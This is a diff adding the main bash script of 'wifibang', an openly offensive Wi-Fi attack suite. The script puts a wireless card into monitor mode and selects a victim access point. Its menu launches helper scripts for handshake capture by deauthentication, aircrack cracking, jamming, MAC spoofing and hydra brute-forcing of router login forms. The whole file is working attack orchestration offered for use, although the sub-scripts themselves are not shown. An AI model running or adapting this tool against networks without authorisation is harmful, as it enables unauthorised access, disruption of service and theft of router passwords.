@@ -1,0 +1,420 @@
+#!/bin/bash
+
+
+#wifibang    -    wifi attacks suite
+#Copyright © 2018 Leviathan36 
+
+#wifibang is free software: you can redistribute it and/or modify
+#it under the terms of the GNU General Public License as published by
+#the Free Software Foundation, either version 3 of the License, or
+#(at your option) any later version.
+
+#wifibang is distributed in the hope that it will be useful,
+#but WITHOUT ANY WARRANTY; without even the implied warranty of
+#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#GNU General Public License for more details.
+
+#You should have received a copy of the GNU General Public License
+#along with wifibang.  If not, see <http://www.gnu.org/licenses/>.
+
+
+
+#-----------------------------------------------------------------------
+#------------------------ VARIABLES & FILES ----------------------------
+#-----------------------------------------------------------------------
+
+####################################################
+               #GLOBAL VARIABLES#
+####################################################
+
+#wifi_int // wireless NIC which performs the attack
+#ap_target // victim's access point to attack
+#ap_ssid // victim's access point ssid
+#ap_channel // victim's access point channel
+#shutdown_all_nic // setup variable to shutdown all wireless NICs before perform the attack (improve success chance)
+
+############# END GLOBAL VARIABLES #################
+
+
+####################################################
+                     #FILES#
+####################################################
+
+#SYNOPSIS: FILE ---> SCRIPTS WHICH USES IT // DESC
+
+#./handshakes --> aircrack; deauth_airodump // contains captured handshake
+#./wordlists --> aircrack; hydra-http // contains wordlists for dictionary attack
+#./router_passwords --> aircrack; hydra-http; connect_to_target // contains decrypted router passwords
+#./user_hydra --> hydra-http // contains user lists for login form attack
+
+#################### END FILES #####################
+
+#-----------------------------------------------------------------------
+#------------------------ FUNCTIONS ------------------------------------
+#-----------------------------------------------------------------------
+
+####################################################
+                    #PRINT#
+####################################################
+
+print () {
+    
+    string=$1
+    
+    clear
+    echo
+    echo "$string"
+    echo
+    
+    return 0
+
+}
+
+################### END PRINT ######################
+
+#-----------------------------------------------------------------------
+
+
+####################################################
+                    #CONTROL-EXIT-STAT#
+####################################################
+
+control_exit_stat () {
+
+    [[ "$?" ]]  || { roll_back; }
+    return 0
+
+}
+
+############## END CONTROL-EXIT-STAT ###############
+
+#-----------------------------------------------------------------------
+
+
+####################################################
+                   #ROLL-BACK#
+####################################################
+
+roll_back () {
+    
+    clear 
+    echo   #formatting op 
+    echo "ROLL BACK: restoring previous setting..."
+
+    #if shutdown_all_nic is set, restart all NICs
+    if [[ "$shutdown_all_nic" != '' ]]
+        then for interface in `ls /sys/class/net`; do           
+                if sudo ifconfig $interface up
+                    then echo "NIC: $interface --> ready"
+                    else echo "ERROR: $interface"; exit 1
+                fi
+             done
+    fi
+          
+    echo  #formatting op        
+
+    #if NIC was put into monitor mode
+    if [[ "$wifi_int" != '' ]] 
+        then
+        #reset monitor mode interface (global wifi_int)
+        sudo ifconfig $wifi_int down || { echo "ERROR: $wifi_int"; exit 1; }
+
+        if sudo iwconfig $wifi_int mode managed
+            then echo "MANAGED mode enable on $wifi_int"
+            else echo "ERROR: $wifi_int"; exit 1
+        fi
+
+        sudo ifconfig $wifi_int up || { echo "ERROR: $wifi_int"; exit 1; }
+    fi
+    
+    return 0
+
+}
+
+################### END ROLL-BACK ##################
+
+#-----------------------------------------------------------------------
+
+####################################################
+                #SELECT INTERFACE#
+####################################################
+
+select_interface () {
+        
+    print "TURN ON ALL WIRELESS NETWORK INTERFACES? [y/n]"	
+    printf ">>> "
+    local choice
+    read choice
+
+    while [[ "$choice" != 'y' && "$choice" != 'n' ]]; do
+        echo "INSERT VALID CHARACTER [y/n]:"
+        printf ">>> "
+        read choice
+    done
+
+    echo  #formatting op
+
+    if [[ "$choice" == 'y' ]]
+        then for interface in `ls /sys/class/net`; do
+                if sudo ifconfig $interface up
+                    then echo "NIC: $interface --> ready"
+                    else echo "ERROR: $interface"; exit 1
+                fi
+             done
+    fi
+    
+    while [[ "$wifi_int" == '' ]]; do       
+        print "SELECT INTERFACE"
+        local counter='0'
+
+        for interface in `ls /sys/class/net`; do
+            if [[ -d "/sys/class/net/$interface/wireless" ]]
+                then echo "$counter) $interface"
+                     let counter++
+            fi
+        done
+
+        echo   #formatting op
+        printf ">>> "
+        local choice_numb
+        read choice_numb
+        echo   #formatting op
+
+        counter='0'
+        for interface in `ls /sys/class/net`; do
+            if [[ -d "/sys/class/net/$interface/wireless" ]]      
+                then if [[ "$choice_numb" == "$counter" ]]
+                        then wifi_int=$interface; break
+                        else let counter++
+                     fi
+            fi
+        done
+    done
+    
+    return 0
+
+}
+
+################## END SELECT INTERFACE ############
+
+#-----------------------------------------------------------------------
+
+####################################################
+                #MONITOR MODE#
+####################################################
+
+monitor_mode () {
+    
+    ### If network manager use wifi_int it's possible that could stop airodump-ng while running because it 
+    ### use the same NIC. Maybe in future I will introduce a controll to avoid this.
+    ### This situation occurs only in test phase, because if you try to hack a wifi probably you aren't connected to it with network manager.
+    
+    sudo ifconfig $wifi_int down || { echo "ERROR: $wifi_int"; exit 1; }
+
+    if sudo iwconfig $wifi_int mode monitor
+        then echo "MONITOR mode enable on $wifi_int"
+        else echo "ERROR: $wifi_int"; exit 1
+    fi
+
+    sudo ifconfig $wifi_int up || { echo "ERROR: $wifi_int"; exit 1; }
+    
+    #sudo airmon-zc start $wifi_int || { echo "ERROR: $wifi_int"; exit 1; }     #equivalent
+
+    print "TURN OFF ALL UNUSED WIRELESS NIC? [y/n]"
+    printf ">>> "
+    read shutdown_all_nic
+
+    while [[ "$shutdown_all_nic" != 'y' && "$shutdown_all_nic" != 'n' ]]; do
+        echo "INSERT VALID CHARACTER [y/n]:"
+        printf ">>> "
+        read shutdown_all_nic
+    done
+
+    if [[ "$shutdown_all_nic" == 'y' ]]
+        then for interface in `ls /sys/class/net`; do
+                if [[ -d /sys/class/net/$interface/wireless && "$interface" != "$wifi_int" ]]      #shutdown only wireless NIC
+                    then if sudo ifconfig $interface down
+                            then echo "DEV: $interface --> down"
+                            else echo "ERROR: $interface"; roll_back; exit 1
+                         fi
+                fi
+             done
+    fi
+    
+    print 'TURN OFF ALL PROCESS ON WIRELESS NIC ("no" is recommended option)? [y/n]'
+    printf ">>> "
+    local shutdown_all_process
+    read shutdown_all_process
+
+    while [[ "$shutdown_all_process" != 'y' && "$shutdown_all_process" != 'n' ]]; do
+        echo "INSERT VALID CHARACTER [y/n]:"
+        printf ">>> "
+        read shutdown_all_process
+    done
+
+    if [[ "$shutdown_all_process" == 'y' ]]
+        then sudo airmon-ng check kill $wifi_int || echo "ERROR: couldn't stop process on $wifi_int interface"
+    fi
+    
+    return 0
+
+}
+        
+
+################ END MONITOR MODE ##################
+
+#-----------------------------------------------------------------------
+
+####################################################
+                #SELECT AP#
+####################################################
+
+select_ap () {
+    
+    #sudo iwconfig $wifi_int mode managed || { echo "ERROR: $wifi_int"; exit 1; }   #NIC could find AP also in monitor mode
+     
+    while [[ "$ap_target" == '' ]]; do   
+        while [[ "$choice" == '' ]]; do       #avoid to do entire cycle     
+            if ! nmcli g > /dev/null 2>&1     #if nmcli is stop it's necessary to restart it
+                then if sudo service network-manager restart
+                        then echo
+                             echo 'network-manager is restarting ...'
+                             sleep 10
+                        else roll_back
+                             exit 1
+                     fi
+            fi 
+            printf "     N°:SSID:PWR\n\n" > file_out_nmcli      #automatically remove file
+            nmcli -c no -t -f SSID,SIGNAL,SECURITY,BSSID,CHAN device wifi list ifname $wifi_int | nl -s ':' >> file_out_nmcli	    
+            print "SELECT AP:"		
+            cat file_out_nmcli | cut -d ':' -f 1,2,3 | column -s ':' -t | more         #print file						
+            echo    #formatting op
+            printf ">>> "
+            local choice
+            read choice
+        done
+
+        while read line; do
+            if [[ `cut -d ':' -f 1 <<< $line` == "$choice" ]]
+                then ap_channel=`cut -d ':' -f 11 <<< $line`                         #select the channel of AP
+                     ap_target=`cut -d ':' -f 5,6,7,8,9,10 <<< $line`		#select the BSSID of APselezioni tutte le coppie essadecimali di cui è composto il BSSID
+                     ap_ssid=`cut -d ':' -f 2 <<< $line`                   #select SSID of AP (evil twin AP attack)
+                     break
+            fi
+        done < file_out_nmcli
+
+        if [[ -d ./file_out_nmcli ]]
+            then rm file_out_nmcli
+        fi   
+    done
+    
+    return 0
+    
+}
+
+################# END SELECT AP ####################
+
+
+#-----------------------------------------------------------------------
+#------------------------ MAIN -----------------------------------------
+#-----------------------------------------------------------------------
+
+
+####################################################
+                       #MAIN#
+####################################################
+
+while [[ "$choice_attack" != '99' ]]; do
+
+    print "CHOICE ATTACK:"
+    echo "1. catch handshake"
+    echo "2. process handshake"
+    echo "3. jammer"
+    echo "4. router login form attack"
+    echo
+    echo '...'
+    echo "99. exit"
+    echo
+    printf ">>> "
+    read choice_attack
+
+    case $choice_attack in
+
+        "1")
+            select_interface
+            control_exit_stat
+            
+            monitor_mode
+            control_exit_stat
+            
+            select_ap
+            control_exit_stat
+            
+            ./txpower $wifi_int
+            control_exit_stat
+
+            #deauth + airodump  (deauth doesn't iterate to avoid errors with subshell and background process. One cycle's sufficient to gain handshake)     
+            ./deauth_airodump $ap_ssid $ap_target $ap_channel $wifi_int 
+            control_exit_stat
+        ;;
+
+        "2")
+            ./aircrack
+            control_exit_stat
+        ;;
+
+        "3")
+            select_interface
+            control_exit_stat
+            
+            monitor_mode
+            control_exit_stat
+
+            select_ap
+            control_exit_stat
+
+            ./txpower $wifi_int
+            control_exit_stat
+
+            ./deauth $ap_target $wifi_int
+            control_exit_stat
+        ;;
+
+        "4")
+            ./restart_wifi
+            control_exit_stat
+
+            select_interface
+            control_exit_stat
+
+            select_ap
+            control_exit_stat
+
+            ./mac_spoof $wifi_int
+            control_exit_stat
+
+            ./connect_to_target $ap_ssid $wifi_int
+            control_exit_stat
+
+            ./hydra-http
+            control_exit_stat
+        ;;
+        
+        "99")
+            exit 0
+        ;;
+    esac
+    
+    #variables reset
+    wifi_int=''
+    ap_target=''
+    ap_ssid=''
+    ap_channel=''
+    shutdown_all_nic=''
+    
+done
+
+#################### END MAIN ######################
+
+
+
